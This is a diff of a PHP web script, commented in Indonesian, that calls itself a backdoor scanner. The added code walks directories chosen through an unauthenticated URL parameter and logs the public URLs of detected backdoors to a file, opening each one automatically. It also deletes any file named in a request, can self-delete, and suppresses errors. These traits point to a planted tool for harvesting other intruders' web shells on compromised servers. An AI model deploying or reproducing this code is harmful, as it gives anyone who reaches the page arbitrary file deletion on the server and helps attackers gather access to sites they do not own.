@@ -2,18 +2,55 @@
 set_time_limit(0);
 error_reporting(0);
 @ini_set('zlib.output_compression', 0);
-header("Content-Encoding: none");
-ob_start();
+@ini_set('implicit_flush', 1);
+for($i = 0; $i < ob_get_level(); $i++) { ob_end_flush(); }
+ob_implicit_flush(1);
 
-// Fungsi untuk memindai semua file di direktori
+$path = getcwd();
+if(isset($_GET['dir'])){
+    $path = $_GET['dir'];
+}
+
+if(isset($_GET['kill'])){
+    unlink(__FILE__);
+}
+
+echo '<link href="https://rasenmedia.my.id/assets/css/bootstrap-dark.css" id="bootstrap-style" rel="stylesheet" type="text/css" />';
+echo '<link href="https://rasenmedia.my.id/assets/css/all.min.css" rel="stylesheet" type="text/css">';
+echo '<link href="https://rasenmedia.my.id/assets/css/app-dark.css" id="app-style" rel="stylesheet" type="text/css">';
+echo '<div class="page-content">';
+echo '<div class="container-fluid">  <div class="row d-flex justify-content-center">';
+echo '<div class="col-12">';
+echo '<div class="card">';
+echo '<h5 class="card-header border-bottom text-uppercase"><center>SCANNER BACKDOOR SCANDALAUS</center></h5>';
+echo '<div class="card-body">';
+echo '<div class="alert bg-primary bg-gradient text-dark d-flex align-items-center" role="alert">';
+echo '<i class="bx bx-info-circle fs-2 me-2"></i><center>Breaking boundaries with elegance and precision, this backdoor scanner is a secret weapon that reveals hidden dimensions in digital codes, paving the way for limitless exploration of the cyber world.</center></div>';
+echo "<a href='?kill'><font color='green'>[Self Delete]</font></a><br>";
+echo '<form action="" method="get"><input class="form-control" type="text" name="dir" value='.$path.' style="width: 900px;"><br><input class="btn btn-primary bg-gradient waves-effect waves-light me-1" type="submit" value="Scanner"></form><br>';
+
+echo "CURRENT DIR: <font color='green'>$path</font><br>";
+
+if(isset($_GET['delete'])){
+    unlink($_GET['delete']);
+    $status = "<font color='red'>FAILED</font>";
+    if(!file_exists($_GET['delete'])){
+        $status = "<font color='green'>Success</font>";
+    }
+    echo "TRY TO DELETE: ".$_GET['delete']." $status <br>"; exit;
+}
+
+scanBackdoor($path);
+
+// Fungsi untuk memindai semua file PHP di direktori
 function ngelist($dir, &$keluaran = array()) {
     $scan = scandir($dir);
     foreach ($scan as $key => $value) {
         $lokasi = $dir . DIRECTORY_SEPARATOR . $value;
-        if (!is_dir($lokasi)) {
-            $keluaran[] = $lokasi;
-        } else if ($value != "." && $value != "..") {
-            ngelist($lokasi, $keluaran);
+        if (is_file($lokasi) && pathinfo($lokasi, PATHINFO_EXTENSION) === 'php') {
+            $keluaran[] = $lokasi; // Hanya file PHP yang ditambahkan
+        } else if (is_dir($lokasi) && $value != "." && $value != "..") {
+            ngelist($lokasi, $keluaran); // Pindai subdirektori
         }
     }
     return $keluaran;
@@ -67,40 +104,33 @@ function save_result($url) {
 }
 
 // Memindai file di direktori dan subdirektori
-$list = ngelist(".");
-echo '<h1 align="center">Simple Backdoor Scanner</h1>';
-echo '<h3 align="center"><a href="https://blogger.googleusercontent.com/img/a/AVvXsEjXKcyzlN7lQBU_lNxNB9FuVv7Di_edVzyIenWc_yGDNQ_VAyWOxhR0gPpRj4VEFxP-Cvwh4QKcQ34NdXWDqOpJvW7Nu33Z5UbEjitGogPNBkztNN91yJykYu2ZcN5CEl8SyGfzc0JV-w6HZiYZgnzedNV4SUtHNPTkC9kbrWjuzGBKYFk616o6ArHuVNE=w546-h128">SCANDALAUS</a></h3>';
-
-// URL dasar (otomatis mengambil dari HTTP_HOST)
-$base_url = "https://" . $_SERVER['HTTP_HOST']; // Menggunakan HTTP_HOST untuk mendapatkan domain otomatis
-
-// Melakukan pemindaian dan menampilkan hasil
-foreach ($list as $value) {
-    if (is_file($value)) {
-        $string = baca($value);
-        if ($string) {
-            $cek = ngecek($string);
-            if (!empty($cek)) {
-                // Menampilkan hasil pemindaian backdoor berwarna merah
-                echo '<p style="color: red;">' . $value . ' => Found (' . $cek . ')</p><hr>';
-                // Mengonversi path file menjadi URL lengkap
-                $file_url = $base_url . '/' . str_replace(DIRECTORY_SEPARATOR, '/', $value);
-                // Menyimpan URL ke dalam file result.txt
-                save_result($file_url);
-                // Membuat link yang bisa diklik untuk membuka file di tab baru
-                echo "<a href='" . $file_url . "' target='_blank' id='link" . md5($value) . "' style='display:block;'>Click to view file</a>";
-                echo "<script>
-                        var link = document.getElementById('link" . md5($value) . "');
-                        // Memicu klik otomatis tanpa mengganggu tampilan
-                        link.click();
-                      </script>";
-            } else {
-                echo '<p style="color: green;">' . $value . ' => Safe</p><hr>';
+function scanBackdoor($current_dir){
+    $list = ngelist($current_dir);
+    foreach ($list as $value) {
+        if (is_file($value)) {
+            $string = baca($value);
+            if ($string) {
+                $cek = ngecek($string);
+                if (!empty($cek)) {
+                    // Menampilkan hasil pemindaian backdoor berwarna merah
+                    echo '<p style="color: red;">' . $value . ' => Found (' . $cek . ')</p><hr>';
+                    // Mengonversi path file menjadi URL lengkap
+                    $base_url = "https://" . $_SERVER['HTTP_HOST']; // Menggunakan HTTP_HOST untuk mendapatkan domain otomatis
+                    $file_url = $base_url . '/' . str_replace(DIRECTORY_SEPARATOR, '/', $value);
+                    // Menyimpan URL ke dalam file result.txt
+                    save_result($file_url);
+                    // Membuat link yang bisa diklik untuk membuka file di tab baru
+                    echo "<a href='" . $file_url . "' target='_blank' id='link" . md5($value) . "' style='display:block;'>Click to view file</a>";
+                    echo "<script>
+                            var link = document.getElementById('link" . md5($value) . "');
+                            // Memicu klik otomatis tanpa mengganggu tampilan
+                            link.click();
+                          </script>";
+                } else {
+                    echo '<p style="color: green;">' . $value . ' => Safe</p><hr>';
+                }
             }
         }
     }
-    ob_flush();
-    flush();
-    sleep(1); // Jeda antara pemindaian
 }
 ?>
